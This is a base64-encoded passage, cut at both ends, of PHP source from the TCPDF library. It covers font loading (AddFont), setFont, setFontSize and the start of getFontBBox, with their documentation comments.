0gc3RyX3JlcGxhY2UoJyAnLCAnJywgJGZhbWlseSkuc3RydG9sb3dlcigkc3R5bGUpLicucGhwJzsKCQkJJGZvbnRmaWxlID0gVENQREZfRk9OVFM6OmdldEZvbnRGdWxsUGF0aCgkdG1wX2ZvbnRmaWxlLCAkZm9udGRpcik7CgkJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZm9udGZpbGUpKSB7CgkJCQkkbWlzc2luZ19zdHlsZSA9IHRydWU7CgkJCQkvLyB0cnkgdG8gcmVtb3ZlIHRoZSBzdHlsZSBwYXJ0CgkJCQkkdG1wX2ZvbnRmaWxlID0gc3RyX3JlcGxhY2UoJyAnLCAnJywgJGZhbWlseSkuJy5waHAnOwoJCQkJJGZvbnRmaWxlID0gVENQREZfRk9OVFM6OmdldEZvbnRGdWxsUGF0aCgkdG1wX2ZvbnRmaWxlLCAkZm9udGRpcik7CgkJCX0KCQl9CgkJLy8gaW5jbHVkZSBmb250IGZpbGUKCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRmb250ZmlsZSkgQU5EIChAVENQREZfU1RBVElDOjpmaWxlX2V4aXN0cygkZm9udGZpbGUpKSkgewoJCQkkdHlwZT1udWxsOwoJCQkkbmFtZT1udWxsOwoJCQkkZGVzYz1udWxsOwoJCQkkdXA9LW51bGw7CgkJCSR1dD1udWxsOwoJCQkkY3c9bnVsbDsKCQkJJGNiYm94PW51bGw7CgkJCSRkdz1udWxsOwoJCQkkZW5jPW51bGw7CgkJCSRjaWRpbmZvPW51bGw7CgkJCSRmaWxlPW51bGw7CgkJCSRjdGc9bnVsbDsKCQkJJGRpZmY9bnVsbDsKCQkJJG9yaWdpbmFsc2l6ZT1udWxsOwoJCQkkc2l6ZTE9bnVsbDsKCQkJJHNpemUyPW51bGw7CgkJCWluY2x1ZGUoJGZvbnRmaWxlKTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+RXJyb3IoJ0NvdWxkIG5vdCBpbmNsdWRlIGZvbnQgZGVmaW5pdGlvbiBmaWxlOiAnLiRmYW1pbHkuJycpOwoJCX0KCQkvLyBjaGVjayBmb250IHBhcmFtZXRlcnMKCQlpZiAoKCFpc3NldCgkdHlwZSkpIE9SICghaXNzZXQoJGN3KSkpIHsKCQkJJHRoaXMtPkVycm9yKCdUaGUgZm9udCBkZWZpbml0aW9uIGZpbGUgaGFzIGEgYmFkIGZvcm1hdDogJy4kZm9udGZpbGUuJycpOwoJCX0KCQkvLyBTRVQgZGVmYXVsdCBwYXJhbWV0ZXJzCgkJaWYgKCFpc3NldCgkZmlsZSkgT1IgVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGZpbGUpKSB7CgkJCSRmaWxlID0gJyc7CgkJfQoJCWlmICghaXNzZXQoJGVuYykgT1IgVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGVuYykpIHsKCQkJJGVuYyA9ICcnOwoJCX0KCQlpZiAoIWlzc2V0KCRjaWRpbmZvKSBPUiBUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkY2lkaW5mbykpIHsKCQkJJGNpZGluZm8gPSBhcnJheSgnUmVnaXN0cnknPT4nQWRvYmUnLCAnT3JkZXJpbmcnPT4nSWRlbnRpdHknLCAnU3VwcGxlbWVudCc9PjApOwoJCQkkY2lkaW5mb1sndW5pMmNpZCddID0gYXJyYXkoKTsKCQl9CgkJaWYgKCFpc3NldCgkY3RnKSBPUiBUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkY3RnKSkgewoJCQkkY3RnID0gJyc7CgkJfQoJCWlmICghaXNzZXQoJGRlc2MpIE9SIFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRkZXNjKSkgewoJCQkkZGVzYyA9IGFycmF5KCk7CgkJfQoJCWlmICghaXNzZXQoJHVwKSBPUiBUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdXApKSB7CgkJCSR1cCA9IC0xMDA7CgkJfQoJCWlmICghaXNzZXQoJHV0KSBPUiBUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdXQpKSB7CgkJCSR1dCA9IDUwOwoJCX0KCQlpZiAoIWlzc2V0KCRjdykgT1IgVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGN3KSkgewoJCQkkY3cgPSBhcnJheSgpOwoJCX0KCQlpZiAoIWlzc2V0KCRkdykgT1IgVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGR3KSkgewoJCQkvLyBzZXQgZGVmYXVsdCB3aWR0aAoJCQlpZiAoaXNzZXQoJGRlc2NbJ01pc3NpbmdXaWR0aCddKSBBTkQgKCRkZXNjWydNaXNzaW5nV2lkdGgnXSA+IDApKSB7CgkJCQkkZHcgPSAkZGVzY1snTWlzc2luZ1dpZHRoJ107CgkJCX0gZWxzZWlmIChpc3NldCgkY3dbMzJdKSkgewoJCQkJJGR3ID0gJGN3WzMyXTsKCQkJfSBlbHNlIHsKCQkJCSRkdyA9IDYwMDsKCQkJfQoJCX0KCQkrKyR0aGlzLT5udW1mb250czsKCQlpZiAoJHR5cGUgPT0gJ2NvcmUnKSB7CgkJCSRuYW1lID0gJHRoaXMtPkNvcmVGb250c1skZm9udGtleV07CgkJCSRzdWJzZXQgPSBmYWxzZTsKCQl9IGVsc2VpZiAoKCR0eXBlID09ICdUcnVlVHlwZScpIE9SICgkdHlwZSA9PSAnVHlwZTEnKSkgewoJCQkkc3Vic2V0ID0gZmFsc2U7CgkJfSBlbHNlaWYgKCR0eXBlID09ICdUcnVlVHlwZVVuaWNvZGUnKSB7CgkJCSRlbmMgPSAnSWRlbnRpdHktSCc7CgkJfSBlbHNlaWYgKCR0eXBlID09ICdjaWRmb250MCcpIHsKCQkJaWYgKCR0aGlzLT5wZGZhX21vZGUpIHsKCQkJCSR0aGlzLT5FcnJvcignQWxsIGZvbnRzIG11c3QgYmUgZW1iZWRkZWQgaW4gUERGL0EgbW9kZSEnKTsKCQkJfQoJCX0gZWxzZSB7CgkJCSR0aGlzLT5FcnJvcignVW5rbm93IGZvbnQgdHlwZTogJy4kdHlwZS4nJyk7CgkJfQoJCS8vIHNldCBuYW1lIGlmIHVuc2V0CgkJaWYgKGVtcHR5KCRuYW1lKSkgewoJCQkkbmFtZSA9ICRmb250a2V5OwoJCX0KCQkvLyBjcmVhdGUgYXJ0aWZpY2lhbCBmb250IHN0eWxlIHZhcmlhdGlvbnMgaWYgbWlzc2luZyAob25seSB3b3JrcyB3aXRoIG5vbi1lbWJlZGRlZCBmb250cykKCQlpZiAoKCR0eXBlICE9ICdjb3JlJykgQU5EICRtaXNzaW5nX3N0eWxlKSB7CgkJCS8vIHN0eWxlIHZhcmlhdGlvbnMKCQkJJHN0eWxlcyA9IGFycmF5KCcnID0+ICcnLCAnQicgPT4gJyxCb2xkJywgJ0knID0+ICcsSXRhbGljJywgJ0JJJyA9PiAnLEJvbGRJdGFsaWMnKTsKCQkJJG5hbWUgLj0gJHN0eWxlc1skYmlzdHlsZV07CgkJCS8vIGFydGlmaWNpYWwgYm9sZAoJCQlpZiAoc3RycG9zKCRiaXN0eWxlLCAnQicpICE9PSBmYWxzZSkgewoJCQkJaWYgKGlzc2V0KCRkZXNjWydTdGVtViddKSkgewoJCQkJCS8vIGZyb20gbm9ybWFsIHRvIGJvbGQKCQkJCQkkZGVzY1snU3RlbVYnXSA9IHJvdW5kKCRkZXNjWydTdGVtViddICogMS43NSk7CgkJCQl9IGVsc2UgewoJCQkJCS8vIGJvbGQKCQkJCQkkZGVzY1snU3RlbVYnXSA9IDEyMzsKCQkJCX0KCQkJfQoJCQkvLyBhcnRpZmljaWFsIGl0YWxpYwoJCQlpZiAoc3RycG9zKCRiaXN0eWxlLCAnSScpICE9PSBmYWxzZSkgewoJCQkJaWYgKGlzc2V0KCRkZXNjWydJdGFsaWNBbmdsZSddKSkgewoJCQkJCSRkZXNjWydJdGFsaWNBbmdsZSddIC09IDExOwoJCQkJfSBlbHNlIHsKCQkJCQkkZGVzY1snSXRhbGljQW5nbGUnXSA9IC0xMTsKCQkJCX0KCQkJCWlmIChpc3NldCgkZGVzY1snRmxhZ3MnXSkpIHsKCQkJCQkkZGVzY1snRmxhZ3MnXSB8PSA2NDsgLy9iaXQgNwoJCQkJfSBlbHNlIHsKCQkJCQkkZGVzY1snRmxhZ3MnXSA9IDY0OwoJCQkJfQoJCQl9CgkJfQoJCS8vIGNoZWNrIGlmIHRoZSBhcnJheSBvZiBjaGFyYWN0ZXJzIGJvdW5kaW5nIGJveGVzIGlzIGRlZmluZWQKCQlpZiAoIWlzc2V0KCRjYmJveCkpIHsKCQkJJGNiYm94ID0gYXJyYXkoKTsKCQl9CgkJLy8gaW5pdGlhbGl6ZSBzdWJzZXRjaGFycwoJCSRzdWJzZXRjaGFycyA9IGFycmF5X2ZpbGwoMCwgMjU1LCB0cnVlKTsKCQkkdGhpcy0+c2V0Rm9udEJ1ZmZlcigkZm9udGtleSwgYXJyYXkoJ2ZvbnRrZXknID0+ICRmb250a2V5LCAnaScgPT4gJHRoaXMtPm51bWZvbnRzLCAndHlwZScgPT4gJHR5cGUsICduYW1lJyA9PiAkbmFtZSwgJ2Rlc2MnID0+ICRkZXNjLCAndXAnID0+ICR1cCwgJ3V0JyA9PiAkdXQsICdjdycgPT4gJGN3LCAnY2Jib3gnID0+ICRjYmJveCwgJ2R3JyA9PiAkZHcsICdlbmMnID0+ICRlbmMsICdjaWRpbmZvJyA9PiAkY2lkaW5mbywgJ2ZpbGUnID0+ICRmaWxlLCAnY3RnJyA9PiAkY3RnLCAnc3Vic2V0JyA9PiAkc3Vic2V0LCAnc3Vic2V0Y2hhcnMnID0+ICRzdWJzZXRjaGFycykpOwoJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCS8vIHdlIGFyZSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2ZvbnRzJ11bJGZvbnRrZXldID0gJHRoaXMtPm51bWZvbnRzOwoJCX0KCQlpZiAoIWVtcHR5KCRkaWZmKSkgewoJCQkvL1NlYXJjaCBleGlzdGluZyBlbmNvZGluZ3MKCQkJJGQgPSAwOwoJCQkkbmIgPSBjb3VudCgkdGhpcy0+ZGlmZnMpOwoJCQlmb3IgKCRpPTE7ICRpIDw9ICRuYjsgKyskaSkgewoJCQkJaWYgKCR0aGlzLT5kaWZmc1skaV0gPT0gJGRpZmYpIHsKCQkJCQkkZCA9ICRpOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQl9CgkJCWlmICgkZCA9PSAwKSB7CgkJCQkkZCA9ICRuYiArIDE7CgkJCQkkdGhpcy0+ZGlmZnNbJGRdID0gJGRpZmY7CgkJCX0KCQkJJHRoaXMtPnNldEZvbnRTdWJCdWZmZXIoJGZvbnRrZXksICdkaWZmJywgJGQpOwoJCX0KCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRmaWxlKSkgewoJCQlpZiAoIWlzc2V0KCR0aGlzLT5Gb250RmlsZXNbJGZpbGVdKSkgewoJCQkJaWYgKChzdHJjYXNlY21wKCR0eXBlLCdUcnVlVHlwZScpID09IDApIE9SIChzdHJjYXNlY21wKCR0eXBlLCAnVHJ1ZVR5cGVVbmljb2RlJykgPT0gMCkpIHsKCQkJCQkkdGhpcy0+Rm9udEZpbGVzWyRmaWxlXSA9IGFycmF5KCdsZW5ndGgxJyA9PiAkb3JpZ2luYWxzaXplLCAnZm9udGRpcicgPT4gJGZvbnRkaXIsICdzdWJzZXQnID0+ICRzdWJzZXQsICdmb250a2V5cycgPT4gYXJyYXkoJGZvbnRrZXkpKTsKCQkJCX0gZWxzZWlmICgkdHlwZSAhPSAnY29yZScpIHsKCQkJCQkkdGhpcy0+Rm9udEZpbGVzWyRmaWxlXSA9IGFycmF5KCdsZW5ndGgxJyA9PiAkc2l6ZTEsICdsZW5ndGgyJyA9PiAkc2l6ZTIsICdmb250ZGlyJyA9PiAkZm9udGRpciwgJ3N1YnNldCcgPT4gJHN1YnNldCwgJ2ZvbnRrZXlzJyA9PiBhcnJheSgkZm9udGtleSkpOwoJCQkJfQoJCQl9IGVsc2UgewoJCQkJLy8gdXBkYXRlIGZvbnRrZXlzIHRoYXQgYXJlIHNoYXJpbmcgdGhpcyBmb250IGZpbGUKCQkJCSR0aGlzLT5Gb250RmlsZXNbJGZpbGVdWydzdWJzZXQnXSA9ICgkdGhpcy0+Rm9udEZpbGVzWyRmaWxlXVsnc3Vic2V0J10gQU5EICRzdWJzZXQpOwoJCQkJaWYgKCFpbl9hcnJheSgkZm9udGtleSwgJHRoaXMtPkZvbnRGaWxlc1skZmlsZV1bJ2ZvbnRrZXlzJ10pKSB7CgkJCQkJJHRoaXMtPkZvbnRGaWxlc1skZmlsZV1bJ2ZvbnRrZXlzJ11bXSA9ICRmb250a2V5OwoJCQkJfQoJCQl9CgkJfQoJCXJldHVybiAkZm9udGRhdGE7Cgl9CgoJLyoqCgkgKiBTZXRzIHRoZSBmb250IHVzZWQgdG8gcHJpbnQgY2hhcmFjdGVyIHN0cmluZ3MuCgkgKiBUaGUgZm9udCBjYW4gYmUgZWl0aGVyIGEgc3RhbmRhcmQgb25lIG9yIGEgZm9udCBhZGRlZCB2aWEgdGhlIEFkZEZvbnQoKSBtZXRob2QuIFN0YW5kYXJkIGZvbnRzIHVzZSBXaW5kb3dzIGVuY29kaW5nIGNwMTI1MiAoV2VzdGVybiBFdXJvcGUpLgoJICogVGhlIG1ldGhvZCBjYW4gYmUgY2FsbGVkIGJlZm9yZSB0aGUgZmlyc3QgcGFnZSBpcyBjcmVhdGVkIGFuZCB0aGUgZm9udCBpcyByZXRhaW5lZCBmcm9tIHBhZ2UgdG8gcGFnZS4KCSAqIElmIHlvdSBqdXN0IHdpc2ggdG8gY2hhbmdlIHRoZSBjdXJyZW50IGZvbnQgc2l6ZSwgaXQgaXMgc2ltcGxlciB0byBjYWxsIFNldEZvbnRTaXplKCkuCgkgKiBOb3RlOiBmb3IgdGhlIHN0YW5kYXJkIGZvbnRzLCB0aGUgZm9udCBtZXRyaWMgZmlsZXMgbXVzdCBiZSBhY2Nlc3NpYmxlLiBUaGVyZSBhcmUgdGhyZWUgcG9zc2liaWxpdGllcyBmb3IgdGhpczo8dWw+PGxpPlRoZXkgYXJlIGluIHRoZSBjdXJyZW50IGRpcmVjdG9yeSAodGhlIG9uZSB3aGVyZSB0aGUgcnVubmluZyBzY3JpcHQgbGllcyk8L2xpPjxsaT5UaGV5IGFyZSBpbiBvbmUgb2YgdGhlIGRpcmVjdG9yaWVzIGRlZmluZWQgYnkgdGhlIGluY2x1ZGVfcGF0aCBwYXJhbWV0ZXI8L2xpPjxsaT5UaGV5IGFyZSBpbiB0aGUgZGlyZWN0b3J5IGRlZmluZWQgYnkgdGhlIEtfUEFUSF9GT05UUyBjb25zdGFudDwvbGk+PC91bD48YnIgLz4KCSAqIEBwYXJhbSBzdHJpbmcgJGZhbWlseSBGYW1pbHkgZm9udC4gSXQgY2FuIGJlIGVpdGhlciBhIG5hbWUgZGVmaW5lZCBieSBBZGRGb250KCkgb3Igb25lIG9mIHRoZSBzdGFuZGFyZCBUeXBlMSBmYW1pbGllcyAoY2FzZSBpbnNlbnNpdGl2ZSk6PHVsPjxsaT50aW1lcyAoVGltZXMtUm9tYW4pPC9saT48bGk+dGltZXNiIChUaW1lcy1Cb2xkKTwvbGk+PGxpPnRpbWVzaSAoVGltZXMtSXRhbGljKTwvbGk+PGxpPnRpbWVzYmkgKFRpbWVzLUJvbGRJdGFsaWMpPC9saT48bGk+aGVsdmV0aWNhIChIZWx2ZXRpY2EpPC9saT48bGk+aGVsdmV0aWNhYiAoSGVsdmV0aWNhLUJvbGQpPC9saT48bGk+aGVsdmV0aWNhaSAoSGVsdmV0aWNhLU9ibGlxdWUpPC9saT48bGk+aGVsdmV0aWNhYmkgKEhlbHZldGljYS1Cb2xkT2JsaXF1ZSk8L2xpPjxsaT5jb3VyaWVyIChDb3VyaWVyKTwvbGk+PGxpPmNvdXJpZXJiIChDb3VyaWVyLUJvbGQpPC9saT48bGk+Y291cmllcmkgKENvdXJpZXItT2JsaXF1ZSk8L2xpPjxsaT5jb3VyaWVyYmkgKENvdXJpZXItQm9sZE9ibGlxdWUpPC9saT48bGk+c3ltYm9sIChTeW1ib2wpPC9saT48bGk+emFwZmRpbmdiYXRzIChaYXBmRGluZ2JhdHMpPC9saT48L3VsPiBJdCBpcyBhbHNvIHBvc3NpYmxlIHRvIHBhc3MgYW4gZW1wdHkgc3RyaW5nLiBJbiB0aGF0IGNhc2UsIHRoZSBjdXJyZW50IGZhbWlseSBpcyByZXRhaW5lZC4KCSAqIEBwYXJhbSBzdHJpbmcgJHN0eWxlIEZvbnQgc3R5bGUuIFBvc3NpYmxlIHZhbHVlcyBhcmUgKGNhc2UgaW5zZW5zaXRpdmUpOjx1bD48bGk+ZW1wdHkgc3RyaW5nOiByZWd1bGFyPC9saT48bGk+QjogYm9sZDwvbGk+PGxpPkk6IGl0YWxpYzwvbGk+PGxpPlU6IHVuZGVybGluZTwvbGk+PGxpPkQ6IGxpbmUgdGhyb3VnaDwvbGk+PGxpPk86IG92ZXJsaW5lPC9saT48L3VsPiBvciBhbnkgY29tYmluYXRpb24uIFRoZSBkZWZhdWx0IHZhbHVlIGlzIHJlZ3VsYXIuIEJvbGQgYW5kIGl0YWxpYyBzdHlsZXMgZG8gbm90IGFwcGx5IHRvIFN5bWJvbCBhbmQgWmFwZkRpbmdiYXRzIGJhc2ljIGZvbnRzIG9yIG90aGVyIGZvbnRzIHdoZW4gbm90IGRlZmluZWQuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkc2l6ZSBGb250IHNpemUgaW4gcG9pbnRzLiBUaGUgZGVmYXVsdCB2YWx1ZSBpcyB0aGUgY3VycmVudCBzaXplLiBJZiBubyBzaXplIGhhcyBiZWVuIHNwZWNpZmllZCBzaW5jZSB0aGUgYmVnaW5uaW5nIG9mIHRoZSBkb2N1bWVudCwgdGhlIHZhbHVlIHRha2VuIGlzIDEyCgkgKiBAcGFyYW0gc3RyaW5nICRmb250ZmlsZSBUaGUgZm9udCBkZWZpbml0aW9uIGZpbGUuIEJ5IGRlZmF1bHQsIHRoZSBuYW1lIGlzIGJ1aWx0IGZyb20gdGhlIGZhbWlseSBhbmQgc3R5bGUsIGluIGxvd2VyIGNhc2Ugd2l0aCBubyBzcGFjZXMuCgkgKiBAcGFyYW0gbWl4ZWQgJHN1YnNldCBpZiB0cnVlIGVtYmVkZCBvbmx5IGEgc3Vic2V0IG9mIHRoZSBmb250IChzdG9yZXMgb25seSB0aGUgaW5mb3JtYXRpb24gcmVsYXRlZCB0byB0aGUgdXNlZCBjaGFyYWN0ZXJzKTsgaWYgZmFsc2UgZW1iZWRkIGZ1bGwgZm9udDsgaWYgJ2RlZmF1bHQnIHVzZXMgdGhlIGRlZmF1bHQgdmFsdWUgc2V0IHVzaW5nIHNldEZvbnRTdWJzZXR0aW5nKCkuIFRoaXMgb3B0aW9uIGlzIHZhbGlkIG9ubHkgZm9yIFRydWVUeXBlVW5pY29kZSBmb250cy4gSWYgeW91IHdhbnQgdG8gZW5hYmxlIHVzZXJzIHRvIGNoYW5nZSB0aGUgZG9jdW1lbnQsIHNldCB0aGlzIHBhcmFtZXRlciB0byBmYWxzZS4gSWYgeW91IHN1YnNldCB0aGUgZm9udCwgdGhlIHBlcnNvbiB3aG8gcmVjZWl2ZXMgeW91ciBQREYgd291bGQgbmVlZCB0byBoYXZlIHlvdXIgc2FtZSBmb250IGluIG9yZGVyIHRvIG1ha2UgY2hhbmdlcyB0byB5b3VyIFBERi4gVGhlIGZpbGUgc2l6ZSBvZiB0aGUgUERGIHdvdWxkIGFsc28gYmUgc21hbGxlciBiZWNhdXNlIHlvdSBhcmUgZW1iZWRkaW5nIG9ubHkgcGFydCBvZiBhIGZvbnQuCgkgKiBAcGFyYW0gYm9vbGVhbiAkb3V0IGlmIHRydWUgb3V0cHV0IHRoZSBmb250IHNpemUgY29tbWFuZCwgb3RoZXJ3aXNlIG9ubHkgc2V0IHRoZSBmb250IHByb3BlcnRpZXMuCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuMAoJICogQHNlZSBBZGRGb250KCksIFNldEZvbnRTaXplKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEZvbnQoJGZhbWlseSwgJHN0eWxlPScnLCAkc2l6ZT1udWxsLCAkZm9udGZpbGU9JycsICRzdWJzZXQ9J2RlZmF1bHQnLCAkb3V0PXRydWUpIHsKCQkvL1NlbGVjdCBhIGZvbnQ7IHNpemUgZ2l2ZW4gaW4gcG9pbnRzCgkJaWYgKCRzaXplID09PSBudWxsKSB7CgkJCSRzaXplID0gJHRoaXMtPkZvbnRTaXplUHQ7CgkJfQoJCWlmICgkc2l6ZSA8IDApIHsKCQkJJHNpemUgPSAwOwoJCX0KCQkvLyB0cnkgdG8gYWRkIGZvbnQgKGlmIG5vdCBhbHJlYWR5IGFkZGVkKQoJCSRmb250ZGF0YSA9ICR0aGlzLT5BZGRGb250KCRmYW1pbHksICRzdHlsZSwgJGZvbnRmaWxlLCAkc3Vic2V0KTsKCQkkdGhpcy0+Rm9udEZhbWlseSA9ICRmb250ZGF0YVsnZmFtaWx5J107CgkJJHRoaXMtPkZvbnRTdHlsZSA9ICRmb250ZGF0YVsnc3R5bGUnXTsKCQlpZiAoaXNzZXQoJHRoaXMtPkN1cnJlbnRGb250Wydmb250a2V5J10pIEFORCBpc3NldCgkdGhpcy0+Q3VycmVudEZvbnRbJ3N1YnNldGNoYXJzJ10pKSB7CgkJCS8vIHNhdmUgc3Vic2V0IGNoYXJzIG9mIHRoZSBwcmV2aW91cyBmb250CgkJCSR0aGlzLT5zZXRGb250U3ViQnVmZmVyKCR0aGlzLT5DdXJyZW50Rm9udFsnZm9udGtleSddLCAnc3Vic2V0Y2hhcnMnLCAkdGhpcy0+Q3VycmVudEZvbnRbJ3N1YnNldGNoYXJzJ10pOwoJCX0KCQkkdGhpcy0+Q3VycmVudEZvbnQgPSAkdGhpcy0+Z2V0Rm9udEJ1ZmZlcigkZm9udGRhdGFbJ2ZvbnRrZXknXSk7CgkJJHRoaXMtPnNldEZvbnRTaXplKCRzaXplLCAkb3V0KTsKCX0KCgkvKioKCSAqIERlZmluZXMgdGhlIHNpemUgb2YgdGhlIGN1cnJlbnQgZm9udC4KCSAqIEBwYXJhbSBmbG9hdCAkc2l6ZSBUaGUgZm9udCBzaXplIGluIHBvaW50cy4KCSAqIEBwYXJhbSBib29sZWFuICRvdXQgaWYgdHJ1ZSBvdXRwdXQgdGhlIGZvbnQgc2l6ZSBjb21tYW5kLCBvdGhlcndpc2Ugb25seSBzZXQgdGhlIGZvbnQgcHJvcGVydGllcy4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjAKCSAqIEBzZWUgU2V0Rm9udCgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRGb250U2l6ZSgkc2l6ZSwgJG91dD10cnVlKSB7CgkJJHNpemUgPSAoZmxvYXQpJHNpemU7CgkJLy8gZm9udCBzaXplIGluIHBvaW50cwoJCSR0aGlzLT5Gb250U2l6ZVB0ID0gJHNpemU7CgkJLy8gZm9udCBzaXplIGluIHVzZXIgdW5pdHMKCQkkdGhpcy0+Rm9udFNpemUgPSAkc2l6ZSAvICR0aGlzLT5rOwoJCS8vIGNhbGN1bGF0ZSBzb21lIGZvbnQgbWV0cmljcwoJCWlmIChpc3NldCgkdGhpcy0+Q3VycmVudEZvbnRbJ2Rlc2MnXVsnRm9udEJCb3gnXSkpIHsKCQkJJGJib3ggPSBleHBsb2RlKCcgJywgc3Vic3RyKCR0aGlzLT5DdXJyZW50Rm9udFsnZGVzYyddWydGb250QkJveCddLCAxLCAtMSkpOwoJCQkkZm9udF9oZWlnaHQgPSAoKGludHZhbCgkYmJveFszXSkgLSBpbnR2YWwoJGJib3hbMV0pKSAqICRzaXplIC8gMTAwMCk7CgkJfSBlbHNlIHsKCQkJJGZvbnRfaGVpZ2h0ID0gJHNpemUgKiAxLjIxOTsKCQl9CgkJaWYgKGlzc2V0KCR0aGlzLT5DdXJyZW50Rm9udFsnZGVzYyddWydBc2NlbnQnXSkgQU5EICgkdGhpcy0+Q3VycmVudEZvbnRbJ2Rlc2MnXVsnQXNjZW50J10gPiAwKSkgewoJCQkkZm9udF9hc2NlbnQgPSAoJHRoaXMtPkN1cnJlbnRGb250WydkZXNjJ11bJ0FzY2VudCddICogJHNpemUgLyAxMDAwKTsKCQl9CgkJaWYgKGlzc2V0KCR0aGlzLT5DdXJyZW50Rm9udFsnZGVzYyddWydEZXNjZW50J10pIEFORCAoJHRoaXMtPkN1cnJlbnRGb250WydkZXNjJ11bJ0Rlc2NlbnQnXSA8PSAwKSkgewoJCQkkZm9udF9kZXNjZW50ID0gKC0gJHRoaXMtPkN1cnJlbnRGb250WydkZXNjJ11bJ0Rlc2NlbnQnXSAqICRzaXplIC8gMTAwMCk7CgkJfQoJCWlmICghaXNzZXQoJGZvbnRfYXNjZW50KSBBTkQgIWlzc2V0KCRmb250X2Rlc2NlbnQpKSB7CgkJCS8vIGNvcmUgZm9udAoJCQkkZm9udF9hc2NlbnQgPSAwLjc2ICogJGZvbnRfaGVpZ2h0OwoJCQkkZm9udF9kZXNjZW50ID0gJGZvbnRfaGVpZ2h0IC0gJGZvbnRfYXNjZW50OwoJCX0gZWxzZWlmICghaXNzZXQoJGZvbnRfZGVzY2VudCkpIHsKCQkJJGZvbnRfZGVzY2VudCA9ICRmb250X2hlaWdodCAtICRmb250X2FzY2VudDsKCQl9IGVsc2VpZiAoIWlzc2V0KCRmb250X2FzY2VudCkpIHsKCQkJJGZvbnRfYXNjZW50ID0gJGZvbnRfaGVpZ2h0IC0gJGZvbnRfZGVzY2VudDsKCQl9CgkJJHRoaXMtPkZvbnRBc2NlbnQgPSAoJGZvbnRfYXNjZW50IC8gJHRoaXMtPmspOwoJCSR0aGlzLT5Gb250RGVzY2VudCA9ICgkZm9udF9kZXNjZW50IC8gJHRoaXMtPmspOwoJCWlmICgkb3V0IEFORCAoJHRoaXMtPnBhZ2UgPiAwKSBBTkQgKGlzc2V0KCR0aGlzLT5DdXJyZW50Rm9udFsnaSddKSkgQU5EICgkdGhpcy0+c3RhdGUgPT0gMikpIHsKCQkJJHRoaXMtPl9vdXQoc3ByaW50ZignQlQgL0YlZCAlRiBUZiBFVCcsICR0aGlzLT5DdXJyZW50Rm9udFsnaSddLCAkdGhpcy0+Rm9udFNpemVQdCkpOwoJCX0KCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIGJvdW5kaW5nIGJveCBvZiB0aGUgY3VycmVudCBmb250IGluIHVzZXIgdW5pdHMuCgkgKiBAcmV0dXJuIGFycmF5CgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjE1MiAoMjAxMi0wMy0yMykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEZvbnRCQm94KCkgewoJCSRmYmJveCA9IGFycmF5KCk7CgkJaWYgKGlzc2V0KCR0aGlzLT5DdXJyZW50Rm9udFsnZGVzYyddWydGb250QkJveCddKSkgewoJCQkkdG1wYmJveCA9IGV4cGxvZGUoJyAnLCBzdWJzdHIoJHRoaXMtPkN1cnJlbnRGb250WydkZXNjJ11bJ0ZvbnRCQm94J10sIDEsIC0xKSk7CgkJCSRmYmJveCA9IGFycmF5X21hcChhcnJheSgkdGhpcywnZ2V0QWJzRm9udE1lYXN1cmUnKSwgJHRtcGJib3gpOwoJCX0gZWxzZSB7CgkJCS8vIEZpbmQgbWF4IHdpZHRoCgkJCWlmIChpc3NldCgkdGhpcy0+Q3VycmVudEZvbnRbJ2Rlc2MnXVsnTWF4V2lkdGgnXSkpIHsKCQkJCSRtYXh3ID0gJHRoaXMtPmdldEFic0ZvbnRNZWFzdXJlKGludHZhbCgkdGhpcy0+Q3VycmVudEZvbnRbJ2Rlc2MnXVsnTWF4V2lkdGgnXSkpOwoJCQl9IGVsc2UgewoJCQkJJG1heHcgPSAwOwoJCQkJaWYgKGlzc2V0KCR0aGlzLT5DdXJyZW50Rm9udFsnZGVzYyddWydNaXNzaW5nV2lkdGgnXSkpIHsKCQkJCQkkbWF4dyA9IG1heCgkbWF4dywgJHRoaXMtPkN1cnJlbnRGb250WydkZXNjJ11bJ01pc3NpbmdXaWR0aCddKTsKCQkJCX0KCQkJCWlmIChpc3NldCgkdGhpcy0+Q3VycmVudEZvbnRbJ2Rlc2MnXVsnQXZnV2lkdGgnXSkpIHsKCQkJCQkkbWF4dyA9IG1heCgkbWF4dywgJHRoaXMtPkN1cnJlbnRGb250WydkZXNjJ11bJ0F2Z1dpZHRoJ10pOwoJCQkJfQoJCQkJaWYgKGlzc2V0KCR0aGlzLT5DdXJyZW50Rm9udFsnZHcnXSkpIHsKCQkJCQkkbWF4dyA9IG1heCgkbWF4dywgJHRoaXMtPkN1cnJlbnRGb250WydkdyddKTsKCQkJCX0KCQkJCWZvcmVhY2ggKCR0aGlzLT5DdXJyZW50Rm9udFsnY3cnXSBhcyAkY2hhciA9PiAkdykgewoJCQkJCSRtYXh3ID0gbWF4KCRtYXh3LCAkdyk7CgkJCQl9CgkJCQlpZiAoJG1heHcgPT0gMCkgewoJCQkJCSRtYXh3ID0gNjAwOwoJCQkJfQoJCQkJJG1heHcgPSAkdGhpcy0+Z2V0QWJzRm9udE1lYXN1cm